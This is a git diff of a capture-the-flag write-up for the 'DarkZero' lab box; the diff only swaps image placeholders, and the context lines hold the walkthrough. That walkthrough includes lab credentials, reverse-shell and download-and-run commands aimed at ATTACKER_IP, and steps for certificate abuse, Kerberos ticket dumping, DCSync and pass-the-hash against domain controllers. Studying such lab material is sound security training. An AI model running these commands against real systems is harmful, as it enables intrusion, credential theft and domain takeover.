@@ -114,7 +114,7 @@ This is an assumed breach scenario, meaning we start out with low-privileged cre
 └─$ nxc ldap DC01.DARKZERO.HTB -u 'john.w' -p 'RFulUtONCOL!' --kerberoasting kerbout.txt
 ```
 
-1
+![](/assets/img/2026-08-04-DarkZero/1.png)
 
 Before testing these credentials on MSSQL, I put together a quick wordlist of domain usernames via RID brute forcing and a couple awk commands in an attempt to AS-REP Roast their accounts. 
 
@@ -126,19 +126,19 @@ Before testing these credentials on MSSQL, I put together a quick wordlist of do
 └─$ tail DomainUsers.txt
 ```
 
-2
+![](/assets/img/2026-08-04-DarkZero/2.png)
 
 ### Finding DC02
 This reveals a few interesting things. John.w seems to be the only real user who isn't a machine account and there are a few key words describing something external. If we take a closer look at the RID brute force output, we'll notice a few SidTypeGroups which disclose the existence of another (perhaps Read-Only) Domain Controller in a separate forest. 
 
-3
+![](/assets/img/2026-08-04-DarkZero/3.png)
 
 If you're unfamiliar with what that means - A Read-Only Domain Controller (RODC) is a domain controller that hosts a read-only copy of the Active Directory database, making it ideal for branch offices or less-trusted locations. From an attacker's perspective, compromising an RODC is generally less valuable than compromising a writable domain controller because changes cannot be made directly to AD, and by default it does not cache every user's password. However, if specific credentials have been cached on the RODC, those can still be extracted and abused, making password replication policies and cache management an important security consideration.
 
 ## MSSQL Server
 So the only real place to look for links between our current DC and that one is probably through the MSSQL server. Using Impacket's [mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) script to connect to that server succeeds, however it only grants us guest privileges.
 
-4
+![](/assets/img/2026-08-04-DarkZero/4.png)
 
 Attempting to enable [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17) on the server fails due to our guest context and there aren't any non-standard databases to enumerate.
 
@@ -153,7 +153,7 @@ The only extended procedure enabled on this server is xp_dirtree, which allows u
 MSSQL> xp_dirtree \\<ATTACKER_IP>\notarealshare
 ```
 
-5
+![](/assets/img/2026-08-04-DarkZero/5.png)
 
 This trick actually succeeds in giving us a NetNTLMv2 hash for the DC01 machine account, however there's no use in attempting to crack it.
 
@@ -176,7 +176,7 @@ MSSQL> use "DC02.darkzero.htb"
 MSSQL> enum_db
 ```
 
-6
+![](/assets/img/2026-08-04-DarkZero/6.png)
 
 ### DC02 Command Execution via xp_cmdshell
 With these newfound permissions, we'll be able to configure xp_cmdshell on DC02 and get command execution that way. I refer to this [Hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#execute-os-commands) article for the exact commands to do so.
@@ -193,7 +193,7 @@ MSSQL> RECONFIGURE
 MSSQL> xp_cmdshell "whoami"
 ```
 
-7
+![](/assets/img/2026-08-04-DarkZero/7.png)
 
 Now we that we're able to execute commands as the svc_sql user, we can simply grab a shell on DC02 as them. I end up going with a PowerShell [one-liner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) and executing it through a PowerShell encoded payload. Be sure to convert your command to UTF-16 Little Endian format since that's what Windows prefers and then serve the shell script over HTTP.
 
@@ -210,7 +210,7 @@ IEX(New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/shelly.ps1')
 └─$ python3 -m http.server 80
 ```
 
-8
+![](/assets/img/2026-08-04-DarkZero/8.png)
 
 With everything primed, we then setup a Netcat listener in another terminal and execute the payload on the MSSQL server via xp_cmdshell.
 
@@ -222,14 +222,14 @@ With everything primed, we then setup a Netcat listener in another terminal and 
 MSSQL> xp_cmdshell "powershell -e <BASE_64_PAYLOAD>"
 ```
 
-9
+![](/assets/img/2026-08-04-DarkZero/9.png)
 
 ## DC02 Privilege Escalation
 
 ### Missing Token Privileges
 There aren't any other users on this DC and we don't seem to have any particularly powerful privileges or group membership so I start enumerating the filesystem. This eventually leads me to finding a backup file containing policy information.
 
-10
+![](/assets/img/2026-08-04-DarkZero/10.png)
 
 Displaying it hints that our current user might have access to SeServiceLogonRight. Synacktiv's [post](https://www.synacktiv.com/en/publications/beyond-acls-mapping-windows-privilege-escalation-paths-with-bloodhound#access-token-privileges) describes this token privilege as the following:
 
@@ -239,7 +239,7 @@ Displaying it hints that our current user might have access to SeServiceLogonRig
 PS> type C:\Policy_Backup.inf
 ```
 
-11
+![](/assets/img/2026-08-04-DarkZero/11.png)
 
 An interesting thing to note is that service accounts in general- think IIS app pools, SQL Server, scheduled tasks - are almost universally granted SeImpersonatePrivilege by design, since they need to impersonate client principals as part of normal operation, which is exactly why potato-class attacks work so reliably against them. If we land a shell as one of these accounts and whoami /priv comes back anemic - no SeImpersonatePrivilege, no SeAssignPrimaryTokenPrivilege, and logon rights like SeServiceLogonRight nowhere in sight - that's a strong signal we're not holding a full, interactive token. 
 
@@ -256,7 +256,7 @@ PS> curl http://<ATTACKER_IP>/Certify.exe -o certify.exe
 PS> .\certify.exe find
 ```
 
-12
+![](/assets/img/2026-08-04-DarkZero/12.png)
 
 After confirming the user template is available to us, we request a certificate while specifying the CA name and that template. This will output a base64-encoded cert.pem file, which we should copy/paste to our local machine.
 
@@ -264,7 +264,7 @@ After confirming the user template is available to us, we request a certificate 
 PS> .\certify.exe request /ca:"DC02\darkzero-ext-DC02-CA" /template:User
 ```
 
-13
+![](/assets/img/2026-08-04-DarkZero/13.png)
 
 Once we have that file locally (The RSA private key and the certificate block), we must convert it into PFX format for later use. Certify also gives us the exact command at the end of our request output. This prompts us to provide a password which is required so just use something simple and easy to remember.
 
@@ -296,7 +296,7 @@ Certipy-AD takes care of this entire process for us, all we need to do is authen
 └─$ proxychains4 certipy-ad auth -pfx cert.pfx -dc-ip 127.0.0.1 -password password
 ```
 
-14
+![](/assets/img/2026-08-04-DarkZero/14.png)
 
 With that NTLM hash in hand, I use Impacket's [changepasswd.py](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py) script to set this user's pass to something arbitrary.
 
@@ -306,7 +306,7 @@ With that NTLM hash in hand, I use Impacket's [changepasswd.py](https://github.c
 └─$ proxychains4 impacket-changepasswd -hashes ':[REDACTED]' DARKZERO.EXT/svc_sql@dc02.darkzero.ext
 ```
 
-15
+![](/assets/img/2026-08-04-DarkZero/15.png)
 
 The final part of this chain is uploading a [RunasCs](https://github.com/antonioCoco/RunasCs) binary to DC02 and using the changed password to obtain a logon type 5 session. I use the `-r` flag to redirect stdin/stdout another Netcat listener on port 1337 for a makeshift shell.
 
@@ -318,7 +318,7 @@ The final part of this chain is uploading a [RunasCs](https://github.com/antonio
 PS> .\RunasCs.exe svc_sql 'Password123!' -l 5 --bypass-uac powershell -r <ATTACKER_IP>:1337
 ```
 
-16
+![](/assets/img/2026-08-04-DarkZero/16.png)
 
 After executing that command we get a shell as svc_sql, except with unrestricted token privileges this time which reveals SeImpersonatePrivilege.
 
@@ -337,7 +337,7 @@ And then we can use Impacket's [smbexec.py](https://github.com/fortra/impacket/b
 └─$ proxychains4 impacket-smbexec cbev:'Password123!'@DC02.darkzero.ext
 ```
 
-17
+![](/assets/img/2026-08-04-DarkZero/17.png)
 
 ## DC01 Privilege Escalation
 
@@ -360,7 +360,7 @@ PS> copy 20260805004307_BloodHound.zip \\<ATTACKER_IP>\share
 
 There is a bidirectional cross-forest trust between darkzero.htb and darkzero.ext, which allows for some interesting attacks to be performed. Looking through BloodHound's general information tab shows that if TGT delegation is enabled, we could use DC01's ticket to escalate privileges.
 
-18
+![](/assets/img/2026-08-04-DarkZero/18.png)
 
 This option is disabled by default, but uploading a tool like [Enum-ADTrusts.ps1](https://github.com/sse-secure-systems/Active-Directory-Spotlights/blob/master/AD-Trusts/Enum-ADTrusts.ps1) gives us more insight and specifically shows us the target flag - CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION .
 
@@ -370,7 +370,7 @@ PS> curl http://<ATTACKER_IP>/Enum-ADTrusts.ps1 -o Enum-ADTrusts.ps1
 PS> . .\Enum-ADTrusts.ps1
 ```
 
-19
+![](/assets/img/2026-08-04-DarkZero/19.png)
 
 This confirms that TGT delegation is enabled between these two domains and gives us the green light for our next attack. 
 
@@ -393,7 +393,7 @@ PS> curl http://<ATTACKER_IP>/Rubeus.exe -o Rubeus.exe
 PS> .\Rubeus.exe triage
 ```
 
-20
+![](/assets/img/2026-08-04-DarkZero/20.png)
 
 Running that triage command enumerates Kerberos tickets cached on DC02 and at the top we see one from DC01's machine account. Dumping that and converting it into ccache format will allow us to use that ticket to perform a DCSync attack against DC01 since it has sufficient privileges.
 
@@ -401,7 +401,7 @@ Running that triage command enumerates Kerberos tickets cached on DC02 and at th
 PS> .\Rubeus.exe dump /user:DC01$ /nowrap
 ```
 
-21
+![](/assets/img/2026-08-04-DarkZero/21.png)
 
 ### DCSync
 After copy/pasting that to our local machine, we just need to decode it from Base64 and convert it from kirbi format to ccache, which is used to extract all NTLM hashes from the domain via Impacket's [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) script.
@@ -414,7 +414,7 @@ After copy/pasting that to our local machine, we just need to decode it from Bas
 └─$ KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass DC01.darkzero.htb
 ```
 
-22
+![](/assets/img/2026-08-04-DarkZero/22.png)
 
 Finally, we can utilize a Pass-The-Hash attack to grab a shell as the Administrator on DC01 and snag the root flag under their Desktop folder to complete this challenge.
 
@@ -422,6 +422,6 @@ Finally, we can utilize a Pass-The-Hash attack to grab a shell as the Administra
 └─$ evil-winrm -i DC01.darkzero.htb -u Administrator -H '[REDACTED]'
 ```
 
-23
+![](/assets/img/2026-08-04-DarkZero/23.png)
 
 That's all y'all, this box was a blast to solve and made use of a great concept that I feel more people should know about in Active Directory, which is cross-forest trusts and behavior as a whole. This box actually didn't have too many steps to complete, but required intimate knowledge of Windows that made it difficult in a way that long attack chains couldn't. I hope this was helpful to anyone following along or stuck and happy hacking!
